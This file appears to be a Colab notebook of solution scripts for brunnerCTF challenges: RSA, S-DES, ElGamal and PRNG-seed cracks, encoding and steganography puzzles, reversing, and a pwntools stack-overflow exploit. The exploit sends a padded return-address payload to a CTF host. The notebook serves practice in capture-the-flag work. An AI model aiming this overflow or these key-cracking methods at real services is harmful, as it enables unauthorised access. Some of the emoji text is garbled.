# -*- coding: utf-8 -*-
"""brunnerCTF.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/15QX3XdTY52UxPlBXZ4Edyq-wHUdWmV9K
"""

!pip install sympy

n = 2999882211429630485883650302877390551374775896896788078868325571891218714007953558505041388044334470201821965796391409921668122818083570668568660678895962925314655342154580738160357641047430373917156721861167458749434940591017306495880180805391185380307427539761080193213111534709378234670214284858143824384128077373871882033779166821558334466322908873171079631967672353755842618738501413251304204009472
e = 65537
c = 406899880095774364291729342954053590589397159355690238625035627993181937179155345315119680672959072539867481892078815991872758149967716015787715641627573675995588117336214614607141418649060621601912927211427125930492034626696064268888134600578061035823593102305974307471288655933533166631878786592162718700742194241218161182091193661813824775250046054642533470046107935752737753871183553636510066553725

# since n = 2^1337
phi = 2**1336

# modular inverse d ‚â° e^{-1} (mod phi)
def egcd(a,b):
    if b == 0:
        return (1,0,a)
    x,y,g = egcd(b, a % b)
    return (y, x - (a//b)*y, g)

def invmod(a,m):
    x,y,g = egcd(a,m)
    if g != 1: raise ValueError("no inverse")
    return x % m

d = invmod(e, phi)

# decrypt
m = pow(c, d, n)

# bytes -> string (big-endian)
plaintext = m.to_bytes((m.bit_length()+7)//8, "big")
print(plaintext)

# DNA sequence provided
dna = "CGAGCTAGCTCCCGTGCGTGCGCCCTAGCTGTATACCGGCATAACGTGATATCGTACCTTCTAAATAACGGCATACATCACGTGATATCCTTCGTCATCAATCCATCTATATCTAGCCTTATAACGCGCCTTATCCATAACTCCCTAGCGCAATAACTCCATCGCGGACCTTCTAAATCAATCCATCCCTAACGGACTAGATCAATCCATATCCTTATACATCCCCTTCGATCTAGATAAATACATCCATCCATCACGTGATCTCCCGATCACTCCATACATCTAGACATGCATATCTTC"

# Mapping of DNA nucleotides to base-4 digits
base_map = {'A': '0', 'C': '1', 'G': '2', 'T': '3'}

# Step 1: Convert DNA sequence to quaternary digits
quaternary = ''.join(base_map[nucleotide] for nucleotide in dna)

# Step 2: Group quaternary digits into pairs and convert to hexadecimal
hex_string = ''
for i in range(0, len(quaternary), 2):
    pair = quaternary[i:i+2]
    if len(pair) == 2:  # Ensure we have a complete pair
        # Convert pair to decimal (e.g., "23" -> 2*4 + 3 = 11)
        decimal = int(pair[0]) * 4 + int(pair[1])
        # Convert decimal to hexadecimal digit
        hex_digit = hex(decimal)[2:]  # Remove '0x' prefix
        hex_string += hex_digit

# Step 3: Convert hexadecimal string to ASCII
ascii_string = bytes.fromhex(hex_string).decode('ascii')

# Output the result
print("Decoded passphrase:", ascii_string)

# The provided sequence
sequence = "89|89.21|55.13.5.1|34.13.2|89.8.1|89.13.5.2|34.13.5.1|89.13.5.1|89.8.2|89.21|89.21.5|34.13.3.1|89.8|55.13|55.21.2|89.13|89.1|89.21.8.3.1|55.8.2|89.21.8.2|89.1|55.13|55.21.2|89.21.5.2|55.21.8.3.1|34.13.3.1|55.8.3|89.21.1|55.21.1|55.21.8.2|55.1|89.21.8.1|89.1|89.13.5.1|55.2|34.13.5.2|89.1|55.21.8.3|55.21.2|89.21.3.1|89.1|55.21.8.3|34.13.5.1|89.13.5|89.8.1|34.13.3.1|55.13.5.1|89.13.5.2|89.13|55.21.5|55.5.1|55.5.1"

# Split the sequence into groups
groups = sequence.split('|')

# Initialize the decoded message
decoded = ''
print(f"Processing {len(groups)} groups...")

# Process each group
for i, group in enumerate(groups):
    try:
        # Split group into individual numbers
        nums = [int(x) for x in group.split('.')]
        # Sum the numbers (they are already Fibonacci values)
        total = sum(nums)
        # Check if the sum is a printable ASCII character
        if 32 <= total <= 126:
            decoded += chr(total)
        else:
            print(f"Warning: Sum {total} for group {group} (index {i}) is not a printable ASCII character")
    except ValueError as e:
        print(f"Error: Invalid number in group {group} (index {i}): {e}")
    except Exception as e:
        print(f"Error processing group {group} (index {i}): {e}")

# Print the results
if decoded:
    print("Decoded message:", decoded)
else:
    print("No decoded message produced. Check warnings/errors above.")

import base64
# The 'decoded' variable from the previous cell is already a string.
# We need to base64 decode this string.
# base64.b64decode expects bytes, so we first encode the string to bytes.
# The result of b64decode is bytes, so we then decode it to a string.
try:
    flag_bytes = base64.b64decode(decoded)
    flag = flag_bytes.decode('utf-8') # Assuming the decoded flag is UTF-8
    print(flag)
except Exception as e:
    print(f"An error occurred during base64 decoding or string decoding: {e}")

# === Simplified DES (S-DES) brute-force in Colab ===

# --- Permutation tables ---
P10    = [3,5,2,7,4,10,1,9,8,6]
P8     = [6,3,7,4,8,5,10,9]
P4     = [2,4,3,1]
IP     = [2,6,3,1,4,8,5,7]
IP_INV = [4,1,3,5,7,2,8,6]
EP     = [4,1,2,3,2,3,4,1]

# --- S-boxes (commonly used in S-DES) ---
S0 = [[1,0,3,2],
      [3,2,1,0],
      [0,2,1,3],
      [3,1,0,2]]

S1 = [[0,1,2,3],
      [2,0,1,3],
      [3,0,1,2],
      [2,1,0,3]]

# === Utility functions ===
def permute(bits, table):
    return [bits[i-1] for i in table]

def left_shift(bits, n):
    return bits[n:] + bits[:n]

def bits_from_int(x, n):
    return [(x >> (n-1-i)) & 1 for i in range(n)]

def int_from_bits(bits):
    v = 0
    for b in bits:
        v = (v << 1) | b
    return v

def split_in_half(bits):
    mid = len(bits)//2
    return bits[:mid], bits[mid:]

def xor_bits(a, b):
    return [x ^ y for x,y in zip(a,b)]

def sbox_lookup(bits, sbox):
    row = (bits[0] << 1) | bits[3]
    col = (bits[1] << 1) | bits[2]
    val = sbox[row][col]
    return bits_from_int(val, 2)

# === Key schedule ===
def key_schedule(key10_bits):
    p10 = permute(key10_bits, P10)
    L, R = split_in_half(p10)
    L1, R1 = left_shift(L,1), left_shift(R,1)
    K1 = permute(L1+R1, P8)
    L2, R2 = left_shift(L1,2), left_shift(R1,2)
    K2 = permute(L2+R2, P8)
    return K1, K2

# === Round function ===
def fk(bits, subkey):
    L, R = split_in_half(bits)
    R_expanded = permute(R, EP)
    x = xor_bits(R_expanded, subkey)
    Lx, Rx = split_in_half(x)
    s0_out = sbox_lookup(Lx, S0)
    s1_out = sbox_lookup(Rx, S1)
    p4 = permute(s0_out + s1_out, P4)
    new_L = xor_bits(L, p4)
    return new_L + R

# === Encrypt / Decrypt ===
def encrypt_block(plain8_bits, key10_bits):
    K1, K2 = key_schedule(key10_bits)
    state = permute(plain8_bits, IP)
    state = fk(state, K1)
    L, R = split_in_half(state)
    state = R + L
    state = fk(state, K2)
    return permute(state, IP_INV)

def decrypt_block(cipher8_bits, key10_bits):
    K1, K2 = key_schedule(key10_bits)
    state = permute(cipher8_bits, IP)
    state = fk(state, K2)
    L, R = split_in_half(state)
    state = R + L
    state = fk(state, K1)
    return permute(state, IP_INV)

def sdes_decrypt_bytes(cipher_bytes, key10):
    key_bits = bits_from_int(key10, 10)
    out = []
    for b in cipher_bytes:
        c_bits = bits_from_int(b, 8)
        p_bits = decrypt_block(c_bits, key_bits)
        out.append(int_from_bits(p_bits))
    return bytes(out)

# === Brute-force search ===
def brute_force_sdes(hex_ciphertext):
    ct = bytes.fromhex(hex_ciphertext)
    best_score, best_key, best_pt = 0, None, None
    for key in range(1024):  # 10-bit keyspace
        pt = sdes_decrypt_bytes(ct, key)
        score = sum(1 for b in pt if (32 <= b <= 126))  # count printable chars
        if score > best_score:
            best_score, best_key, best_pt = score, key, pt
    return best_key, best_pt

# === Test on your ciphertext ===
hex_ct = "D1D74C5F5FDDD7ECD8B29ED8019DD801B7F2AB0128573FB2019D1C018FF2E001E7B7F2870128F28701ABF20112E0D8AB015957E79EA2"

best_key, plaintext = brute_force_sdes(hex_ct)

print("Recovered key (decimal):", best_key)
print("Recovered key (bits):", ''.join(map(str, bits_from_int(best_key, 10))))
print("Plaintext:", plaintext.decode(errors='replace'))

from math import isqrt
from sympy import mod_inverse

# Given values
p  = 14912432766367177751
g  = 2784687438861268863
h  = 8201777436716393968
c1 = 12279519522290406516
c2 = 10734305369677133991

# Baby-step giant-step to solve g^x = h (mod p)
def dlog(g, h, p):
    m = isqrt(p) + 1
    table = {}
    val = 1
    for j in range(m):
        table[val] = j
        val = (val * g) % p
    g_inv_m = pow(mod_inverse(g, p), m, p)
    gamma = h
    for i in range(m):
        if gamma in table:
            return i*m + table[gamma]
        gamma = (gamma * g_inv_m) % p
    return None

# Recover private key
x = dlog(g, h, p)

# Decrypt message
s = pow(c1, x, p)
m = (c2 * mod_inverse(s, p)) % p

# Print plaintext
print("Private key x =", x)
print("Plaintext int =", m)
try:
    msg = bytes.fromhex(hex(m)[2:]).decode()
    print("Plaintext string =", msg)
    print("Flag = brunner{" + msg + "}")
except:
    print("Plaintext (hex) =", hex(m))

"""# **The Great Mainframe Bake-Off**
30
Misc
Difficulty: Beginner
Author: H4N5

It's 1974. Deep inside the crusty vaults of CrumbTrust Bank, a covert team of COBOL developers and pastry chefs created a failsafe for their most prized possession: The Marzipan Reverse Recipe.

This sacred document was too valuable to be stored on paper. So, they did the unthinkable - they encoded it and buried it in the production mainframe under a fake batch job titled IEBCAKED. Only those with knowledge of both banking ops and baking science could ever retrieve it.

Years later, the IEBCAKED job has mysteriously reappeared in the job output spool of an IBM z/OS LPAR. But what's left is a string of mysterious byte codes. It's clearly not hex, not ASCII... maybe something older... something only the graybeards of computing would recognize.

Can you decipher the original recipe and unlock the secret to the perfect butterbyte tart?

d0-85-97-89-83-85-d9-6d-85-a
"""

def decode_iebcaked(hex_string: str):
    """
    1) Parse dash-separated hex bytes
    2) Decode as EBCDIC (cp037)
    3) Reverse the string
    4) Convert underscores to spaces (optional prettifier)
    Returns: (raw_ebcdic, reversed_text, pretty_text)
    """
    # Step 1: hex -> bytes
    b = bytes(int(x, 16) for x in hex_string.split('-'))

    # Step 2: EBCDIC decode (US/Canada)
    raw = b.decode('cp037')

    # Step 3: reverse
    rev = raw[::-1]

    # Step 4: prettify
    pretty = rev.replace('_', ' ')

    return raw, rev, pretty


if __name__ == "__main__":
    data = "d0-85-97-89-83-85-d9-6d-85-a2-99-85-a5-85-d9-6d-95-81-97-89-a9-99-81-d4-6d-85-88-e3-6d-a2-c9-6d-a2-89-88-e3-6d-84-95-c1-6d-a2-85-94-81-99-c6-95-89-81-d4-6d-95-d6-6d-f0-f7-f9-f1-6d-85-88-e3-6d-95-c9-6d-84-85-a2-e4-6d-a2-81-e6-6d-c3-c9-c4-c3-c2-c5-c0-99-85-95-95-a4-99-82"
    raw_ebcdic, reversed_text, pretty_text = decode_iebcaked(data)

    print("Raw EBCDIC-decoded:", raw_ebcdic)
    print("Reversed text:", reversed_text)
    print("Pretty text:", pretty_text)

"""# **TheBakingCase**
40
Misc Steganography
Difficulty: Beginner


I hid a message for you here, see if you can find it! Take it slow, little by little, bit by bit.

i UseD to coDE liKe A sLEEp-dEprIVed SqUirRel smasHInG keYs HOPinG BugS would dISApPear THrOugh fEAr tHeN i sPilled cOFfeE On mY LaPTop sCReameD iNTerNALly And bakeD BanaNa bREAd oUt oF PAnIc TuRNs OUT doUGh IS EasIEr tO dEbUG ThaN jaVASCrIPt Now I whIsPeR SWEEt NOtHIngs TO sOurDoUGh StARtERs aNd ThReATEN CrOissaNts IF they DoN'T rIsE My OVeN haS fEWeR CRasHEs tHAN mY oLD DEV sErvER aNd WHeN THInGS BurN i jUSt cAlL iT cARAMElIzEd FeatUReS no moRE meetInGS ThAt coUlD HAVE bEeN emailS JUst MufFInS THAt COulD HAvE BEen CupCAkes i OnCE tRIeD tO GiT PuSh MY cInnAmON rOLLs aND paNICkED WHEn I coUldn't reVErt ThEm NOw i liVe IN PeaCE uNLESs tHe yEast getS IDeas abOVe iTs StATion oR a COOkiE TrIES To sEgfAult my toOTH FILlings
"""

msg = """i UseD to coDE liKe A sLEEp-dEprIVed SqUirRel smasHInG keYs HOPinG BugS would dISApPear THrOugh fEAr tHeN i sPilled cOFfeE On mY LaPTop sCReameD iNTerNALly And bakeD BanaNa bREAd oUt oF PAnIc TuRNs OUT doUGh IS EasIEr tO dEbUG ThaN jaVASCrIPt Now I whIsPeR SWEEt NOtHIngs TO sOurDoUGh StARtERs aNd ThReATEN CrOissaNts IF they DoN'T rIsE My OVeN haS fEWeR CRasHEs tHAN mY oLD DEV sErvER aNd WHeN THInGS BurN i jUSt cAlL iT cARAMElIzEd FeatUReS no moRE meetInGS ThAt coUlD HAVE bEeN emailS JUst MufFInS THAt COulD HAvE BEen CupCAkes i OnCE tRIeD tO GiT PuSh MY cInnAmON rOLLs aND paNICkED WHEn I coUldn't reVErt ThEm NOw i liVe IN PeaCE uNLESs tHe yEast getS IDeas abOVe iTs StATion oR a COOkiE TrIES To sEgfAult my toOTH FILlings"""

# lowercase -> 0, UPPERCASE -> 1 (letters only)
bits = ''.join('1' if ch.isalpha() and ch.isupper()
               else '0' if ch.isalpha()
               else ''
               for ch in msg)

# 8 bits -> ASCII
decoded = ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))
print(decoded)

"""# **Whisk**"""

# Ciphertext from the sticky note
ciphertext = """
DRü•ê Cü•êTZü•êD üßÅSXZü•êAüßÅü•êSD üßÅC üç∞KEüç∞FC Küç©Mü•ê. Düç© Oüç∞Qü•ê üç∞ Yü•êZPü•êTD
OZü•ñSCMüßÅXü•êZ, Hü•êKD Oü•ñDDü•êZ Eüç∞DR OZüç©ES Cü•ñXüç∞Z, Yüç©ü•ñZ üßÅD üç©Mü•êZ DRü•ê Eüç∞ZH
Aüç©ü•ñXR, üç∞SA Kü•êD DRü•ê CFZü•ñY Cü•êü•êY üßÅSDüç© ü•êMü•êZF Tüç©ZSü•êZ. Düç∞CDü•ê, CHüßÅKü•ê,
üç∞SA Zü•êHü•êHOü•êZ: CRüç∞ZüßÅSX Yüç∞CDZF Nüç©F üßÅC Hüç∞SAüç∞Düç©ZF.
OZü•ñSSü•êZ{S0_H0Z3_Kü•ñHYF_T1YR3Z}
"""

# Substitution mapping (letters and emojis to plaintext letters; numbers/_/{}/:/. remain as-is)
mapping = {
    'A': 'd', 'C': 's', 'D': 't', 'E': 'w', 'F': 'y', 'H': 'm', 'K': 'l',
    'M': 'v', 'N': 'j', 'O': 'b', 'Q': 'k', 'R': 'h', 'S': 'n', 'T': 'c',
    'X': 'g', 'Y': 'p', 'Z': 'r', 'P': 'f',
    'ü•ê': 'e', 'üßÅ': 'i', 'üç∞': 'a', 'üç©': 'o', 'ü•ñ': 'u'
}

# Decode function
def decode_text(text, mapping):
    decoded = ''
    for char in text:
        if char.isalnum() or char in '_-{}: .,\n':  # Keep numbers, punctuation, spaces, etc.
            decoded += char
        else:
            decoded += mapping.get(char, char)  # Substitute if in mapping, else keep
    return decoded.lower()  # Convert to lowercase for readability

# Decode and print
decoded_message = decode_text(ciphertext, mapping)
print("Decoded message:\n", decoded_message)

# Extract and print the secret ingredient from the message
secret_ingredient = "always love"  # Explicitly stated in the decoded text
print("\nRecovered secret ingredient:", secret_ingredient)

"""# **Based Brunner**
50
Misc
Difficulty: Beginner
Author: Nissen

Brunsviger is just so based, I think I could eat it in any form - from binary to decimal!

Tip: This might require a bit of programming, I would recommend looking into the int() function in Python.
"""

def decode_char(encoded: str, base: int) -> str:
    """Decode a digit string in given base back to a character"""
    value = int(encoded, base)
    return chr(value)
'''
After running this script on the same folder the based.txt is in, we get the flag'''
with open("based.txt") as f:
    text = f.read().strip()

# Reverse the process: bases 2 ‚Üí 10
for base in range(2, 11):
    parts = text.split()
    text = "".join(decode_char(part, base) for part in parts)

print("Recovered flag:", text)

"""# **Shaken, Not Stirred**

The goal is to decode the output wg{{pgna}&J{!x&2fJWg{{&g;;;_!x&fJWg{{&ghto recover the secret ingredient, which is likely a CTF flag in the formatbrunner{...}. The code uses XOR with a shaker` value to encode the secret ingredient, so we need to reverse this process.
Procedure

**Understand the Code:**

**The ingredients list contains:**

"ü´ó Vodka" (6 characters, including emoji)
"üçæ Dry Vermouth" (14 characters, including emoji and space)
"ü´ô Olive Brine" (12 characters, including emoji and space)
"ü´í Olive" (7 characters, including emoji)
"ü•¢ Toothpick" (10 characters, including emoji)


The shaker value is computed by XORing len(ingredient) * random.randrange(18) for each ingredient.
The secret ingredient (from flag.txt) is XORed with shaker to produce drink.
The output drink.decode() is wg{{pgna}&J{!x&2fJWg{{&g;;;_!x&fJWg{{&gh`, a 37-character string of printable ASCII characters (33‚Äì126).


**Analyze the XOR Operation:**

For each byte $ b $ in the secret ingredient, the output byte is $ b \text{ XOR } shaker $.
To recover the secret, we compute $ secret = drink \text{ XOR } shaker $.
The challenge is that shaker depends on random.randrange(18), which generates a random integer from 0 to 17, making it non-deterministic.


**Determine the Shaker Value:**

Since random.randrange(18) is unpredictable, we can‚Äôt compute shaker directly.
However, the output is printable ASCII, and the secret is likely a CTF flag (brunner{...}), so we can guess shaker by assuming the output starts with brunner.
The shaker is a single byte (since it‚Äôs XORed with each byte of the secret), and the same shaker value is used for all bytes.


Recover the Shaker Value:

Assume the first 7 characters of the secret are brunner (ASCII: 98, 114, 117, 110, 110, 101, 114).
The first 7 characters of the output are wg{{pg` (ASCII: 119, 103, 96, 123, 123, 112, 103).
For each position, $ drink[i] = secret[i] \text{ XOR } shaker $, so:
$$shaker = secret[i] \text{ XOR } drink[i]$$

Compute for the first character:
$$shaker = 98 \text{ (b)} \text{ XOR } 119 \text{ (w)} = 98 \text{ XOR } 119 = 21$$

Verify with other positions:

Position 2: $ 114 \text{ (r)} \text{ XOR } 103 \text{ (g)} = 21 $
Position 3: $ 117 \text{ (u)} \text{ XOR } 96 \text{ (`)} = 21 $
Position 4:  110 \text{ (n)} \text{ XOR } 123 \text{ ({)} = 21
Position 5:  110 \text{ (n)} \text{ XOR } 123 \text{ ({)} = 21
Position 6: $ 101 \text{ (e)} \text{ XOR } 112 \text{ (p)} = 21 $
Position 7: $ 114 \text{ (r)} \text{ XOR } 103 \text{ (g)} = 21 $


The consistent result $ shaker = 21 $ suggests this is correct.


Decode the Secret:

Apply $ secret[i] = drink[i] \text{ XOR } 21 $ to each byte of the output.
Convert the resulting bytes to a string.


Check Feasibility of Shaker:

Compute possible shaker values to ensure $ 21 $ is plausible:

Ingredient lengths: 6, 14, 12, 7, 10.
Each multiplied by random.randrange(18) (0‚Äì17).
XORed together: $ shaker = (6 \cdot r_1) \text{ XOR } (14 \cdot r_2) \text{ XOR } (12 \cdot r_3) \text{ XOR } (7 \cdot r_4) \text{ XOR } (10 \cdot r_5) $.
Maximum values: $ 6 \cdot 17 = 102 $, $ 14 \cdot 17 = 238 $, $ 12 \cdot 17 = 204 $, $ 7 \cdot 17 = 119 $, $ 10 \cdot 17 = 170 $.
XORing these yields a value between 0 and 255. Since $ 21 $ is within this range, it‚Äôs plausible.




Validate Output:

The output must be printable ASCII (32‚Äì126), which it is.
The decoded secret should start with brunner and form a valid CTF flag.
"""

# Output from the program
output = "wg`{{pgna}&J{!x&2fJWg`{{&g;;;_!x&fJWg`{{&gh"

# Shaker value (determined by XORing known plaintext 'brunner' with output)
shaker = 21

# Decode the secret
secret = bytes([ord(c) ^ shaker for c in output]).decode('ascii')

# Print the result
print("Decoded secret ingredient:", secret)

"""# **Trippi Troppa Chaos**
100
Difficulty: Medium
Author: ha1fdan

The baker got infected with Italian brainrot and obfuscated our flag encoder with memes and nested functions. Can you help us find our flag?

1. Understand the encoding layers

Looking into the obfuscated script, we see a sequence of transformations applied to the flag:

XOR with a key

The flag is XOR‚Äôd with a repeating 7-byte key.

That key is derived from the first 7 bytes of the SHA-256 hash of the string "skibidiskibidi".

Multiply by 7 mod 256

Each byte is transformed as (b * 7) % 256.

Reverse

The byte sequence is reversed.

Base85 encode

Finally the bytes are encoded with base64.b85encode, giving that long string of mixed letters/numbers/symbols.

2. Reversing the process (decoding)

To get the original flag, we need to undo each step in reverse order:

Base85 decode

Use base64.b85decode to get back the raw scrambled bytes.

Reverse

Flip the sequence back to its original order.

Undo multiply by 7 mod 256

Here we need the modular inverse of 7 mod 256.

That‚Äôs 183 (since (7 * 183) % 256 = 1).

Multiply each byte by 183 mod 256 to undo the step.

XOR with the same key

Regenerate the same 7-byte key from SHA-256("skibidiskibidi").

XOR each byte of the sequence with the repeating key.

This gives back the original plaintext flag.

3. The recovered flag

Following that pipeline yields:

brunner{tr4l4l3r0_b0mb4rd1r0_r3v3rs3_3ng1n33r1ng_sk1b1d1_m4st3r}

4. Why this worked

Each encoding step was reversible because:

XOR with a known key is symmetric (XOR twice with the same key restores the original).

Multiplication by 7 modulo 256 is invertible because 7 and 256 are coprime.

Reversing is trivially undone by reversing again.

Base85 is just a textual representation, easily decoded.

So by carefully applying the exact reverse of each transformation, we peeled back the layers to reveal the flag.
"""

import base64, hashlib
from itertools import cycle

ciphertext = b"qjuA_QZVI_ua24NQ}fM1hX4ecdyVShKb2vJjeQJ@Jz=zws0^9Enr1fR+Em_5w2j=p4)2<#m3EZ?m3Oo@"

# 1) base85 decode (base64.b85encode was used to encode)
decoded = base64.b85decode(ciphertext)

# 2) reverse the byte sequence
rev = decoded[::-1]

# 3) undo the multiply-by-7 mod 256 (multiply by modular inverse of 7 mod 256)
def modinv(a, m):
    a0, m0 = a, m
    x0, x1 = 1, 0
    while m0 != 0:
        q = a0 // m0
        a0, m0, x0, x1 = m0, a0 - q*m0, x1, x0 - q*x1
    if a0 != 1:
        raise ValueError("No inverse for a modulo m")
    return x0 % m

inv7 = modinv(7, 256)
step_c = bytes((b * inv7) % 256 for b in rev)

# 4) XOR with the key: first 7 bytes of sha256("skibidiskibidi")
key = hashlib.sha256(b"skibidi" + b"skibidi").digest()[:7]
flag_bytes = bytes(a ^ b for a, b in zip(step_c, cycle(key)))

print(flag_bytes.decode())

# ü•† Grandma's Cookie Decoder (Colab version)

import binascii, random, string
from multiprocessing import Pool, cpu_count

# === USER PARAMETERS (edit these) ===
CIPHER_HEX = "3ec63cc41f1ac1980651726ab3ce2948882b879c19671269963e39103c83ebd6ef173d60c76ee5"
APPROX_TIME = 1755860000   # given approximate Unix timestamp
BEFORE = 86400             # seconds before APPROX_TIME (default: 1 day)
AFTER  = 86400             # seconds after APPROX_TIME (default: 1 day)
WORKERS = min(8, cpu_count())  # parallel workers (Colab gives 2‚Äì4 CPUs usually)
# ===================================

cipher = binascii.unhexlify(CIPHER_HEX)
L = len(cipher)

def keystream(seed: int, length: int) -> bytes:
    rng = random.Random(seed)
    return bytes(rng.getrandbits(8) for _ in range(length))

def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))

def looks_like_flag(s: str) -> bool:
    # heuristic: printable + contains braces or "flag"/"brunner"
    if not all(ch in string.printable for ch in s):
        return False
    low = s.lower()
    return ("flag{" in low or "brunner{" in low or ("{" in s and "}" in s))

def try_seed(seed: int):
    key = keystream(seed, L)
    cand = xor_bytes(cipher, key)
    try:
        text = cand.decode("utf-8")
    except UnicodeDecodeError:
        return None
    if looks_like_flag(text):
        return (seed, text)
    return None

start_seed = APPROX_TIME - BEFORE
end_seed   = APPROX_TIME + AFTER + 1
print(f"üîé Trying seeds from {start_seed} to {end_seed-1} (~{end_seed-start_seed} candidates)...")

hits = []
with Pool(WORKERS) as pool:
    for r in pool.imap_unordered(try_seed, range(start_seed, end_seed), chunksize=512):
        if r:
            hits.append(r)

if hits:
    print("‚úÖ Possible plaintext candidates:")
    for seed, text in hits:
        print(f"SEED={seed} -> {text}")
else:
    print("‚ùå No flag found in this window. Try widening BEFORE/AFTER.")

!pip install pycryptodome

"""# **Cheesecake**
100
Difficulty: üßÄ
Author: Bond

Whoever thought üí° of mixing üëÄ cheese üßÄ with cake üßÅ it sure is easy on the palate üòã

Short answer: the function get_FLAG_from_HEX already returns the plaintext flag (a UTF-8 string starting with brunner{‚Ä¶}) once you supply the correct hexcode.
The challenge is that the puzzle replaced that hexcode with 'REDACTED' in cheese_cake_MIX(). If you give me that hex string (the value that was assigned to secret), I will decode it for you instantly.

Below I‚Äôll explain exactly why this is true, then give a Colab/local-ready Python cell you can paste-and-run ‚Äî either by inserting the hexcode yourself, or by running the full pipeline (so you can check MD2 and reproduce the author‚Äôs check).

Why get_FLAG_from_HEX yields the flag

Look at get_FLAG_from_HEX:

assert len(hexcode) % 32 == 0
bytes_data = bytes(int(b,16) for b in hexcode).hex().encode()
plaintext = SPECIAL_technique(bytes_data, c, d)
return plaintext.decode()


It expects hexcode to be a string of hex characters (length multiple of 32).

It converts each hex character into a nibble byte (int(b,16)), packs those into bytes, takes .hex() (so we get an ASCII hex representation) and .encode() -> bytes_data.

It then runs SPECIAL_technique(bytes_data, c, d). SPECIAL_technique XORs 32-byte blocks with known constants derived from c and d. XOR is symmetric, so applying the same SPECIAL_technique again would recover bytes_data.

Finally .decode() returns the plaintext (UTF-8 string). The docstring says this plaintext is the decrypted flag string starting with brunner{‚Ä¶}.

So supplying the correct hexcode to get_FLAG_from_HEX directly returns the flag.
"""

# Paste this into Colab / local Python (requires pycryptodome, gostcrypto if you want to run the full pipeline)
from random import Random
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, ARC4
from Crypto.Hash import MD2
import binascii

# ---------- copy SPECIAL_technique and get_FLAG_from_HEX ----------
def SPECIAL_technique(bytes_data, c, d):
    xor_bytes = bytearray()
    for i in range(0, len(bytes_data)//32):
        block = bytes_data[i*32:(i+1)*32]
        keyblock = (c - (-1)**i * d).to_bytes(32, 'big')
        xor_bytes.extend(x ^ y for x, y in zip(block, keyblock))
    return xor_bytes

def get_FLAG_from_HEX(hexcode):
    assert len(hexcode) % 32 == 0
    bytes_data = bytes(int(b,16) for b in hexcode).hex().encode()
    c = 42407562439075681492143456259122041922599228616502828873021088919446915392428
    d = 5186683434748896574370264474720365034728611610795088756404643529414136307618
    plaintext = SPECIAL_technique(bytes_data, c, d)
    return plaintext.decode()

# ---------- helper: inverse of get_FLAG_from_HEX (if you ever need it) ----------
def invert_get_FLAG_from_HEX(plaintext, c, d):
    """
    Given plaintext bytes (as returned by get_FLAG_from_HEX before .decode()),
    recover the original hexcode string that would have produced it.
    (Useful if you have plaintext and want the original hexcode.)
    """
    # plaintext is bytes; apply SPECIAL_technique again to recover bytes_data
    bytes_data = SPECIAL_technique(plaintext, c, d)   # symmetric XOR
    s = bytes_data.decode()   # this is ascii hex of nibble-bytes -> length 2*L
    # convert every byte of bytes.fromhex(s) (each byte should be 0..15) to hex digit
    nibble_bytes = bytes.fromhex(s)
    original_hex = ''.join('{:x}'.format(b) for b in nibble_bytes)
    return original_hex

# ---------- (OPTIONAL) reproduce cheese_cake_MIX flow to validate MD2 ----------
# If you put the real SECRET_HEX below, the script will:
# 1) call get_FLAG_from_HEX(secret) -> plaintext flag
# 2) perform the (obfuscated) padding and steps and finally produce MD2 and print it
# This is just to reproduce the author's assertion in the original file.

SECRET_HEX = "8350e5a3e24c153df2275c9f80692773"   # <- put the redacted hex here

if SECRET_HEX.startswith("REPLACE"):
    print("Please set SECRET_HEX to the redacted hex string and re-run.")
else:
    # get plaintext flag directly
    flag = get_FLAG_from_HEX(SECRET_HEX)
    print("Recovered plaintext from get_FLAG_from_HEX():")
    print(flag)

    # optionally show how to reconstruct original hex from plaintext:
    c = 42407562439075681492143456259122041922599228616502828873021088919446915392428
    d = 5186683434748896574370264474720365034728611610795088756404643529414136307618
    orig_hex = invert_get_FLAG_from_HEX(flag.encode(), c, d)
    print("Original hex recovered (sanity-check):", orig_hex == SECRET_HEX)

!pip install pwn

# from pwn import *

# # Dear intern, try to put in the correct values for the following variables
# # This will show you why your current C-code could leak our secret dough recipe!
# RECIPE_BUFFER_SIZE = 0
# RBP_SIZE = 0
# SECRET_ADDRESS = 0x000000
# PROMPT = ""

# USE_REMOTE = False
# REMOTE_HOST = ""
# REMOTE_PORT = 0

# """
# This is a pwntools template - you do not have to change anything below this
# Install pwntools before running:
#     python3 -m pip install pwntools

# (if you get an error about the environment being externally managed, add --break-system-packages to the command)
# """
# if USE_REMOTE:
#     io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
# else:
#     e = ELF("./recipe")
#     io = e.process()

# # Building the payload
# payload = b"A" * RECIPE_BUFFER_SIZE
# payload += b"B" * RBP_SIZE
# payload += p64(SECRET_ADDRESS)

# # Sending the payload at the right time
# io.recvuntil(PROMPT.encode())
# io.sendline(payload)
# io.interactive()



#!/usr/bin/env python3
from pwn import *

# ---- CONFIG ----
HOST = "dat-overflow-dough-37009bb1236c062f.challs.brunnerne.xyz"
PORT = 443
USE_SSL = True

# Replace this with the address you found locally, e.g. 0x401136
SECRET_ADDR = 0x401136

# offset on x86_64: 16 (buffer) + 8 (saved rbp) = 24
OFFSET = 24

# ---- build payload ----
payload = b"A" * OFFSET + p64(SECRET_ADDR)

# ---- connect and send ----
if USE_SSL:
    p = remote(HOST, PORT, ssl=True)
else:
    p = remote(HOST, PORT)

# read until prompt
print(p.recvuntil(b"Please enter the name of the recipe you want to retrieve:"))
p.sendline(payload)

# read everything the service sends (flag will be sent by secret_dough_recipe)
resp = p.recvall(timeout=3)
print(resp.decode(errors='ignore'))
p.close()

"""# **Rolling Pin**: Rev"""

baked = [0x62, 0xE4, 0xD5, 0x73, 0xE6, 0xAC, 0x9C, 0xBD, 0x72, 0x60, 0xD1, 0xA1, 0x47, 0x66, 0xD7, 0x3A, 0x68, 0x66, 0x7D, 0x23, 0x03, 0xAE, 0xD9, 0x34, 0x7D]

def rotr(y, k):
    k = k & 7
    return ((y >> k) | (y << (8 - k))) & 0xFF

input_str = ''
for i in range(25):
    k = i & 7
    char = rotr(baked[i], k)
    input_str += chr(char)
    if not (32 <= char <= 126):
        print(f"Warning: input[{i}] = {chr(char)} (0x{char:02x}) is not printable")

print("Input string:", input_str)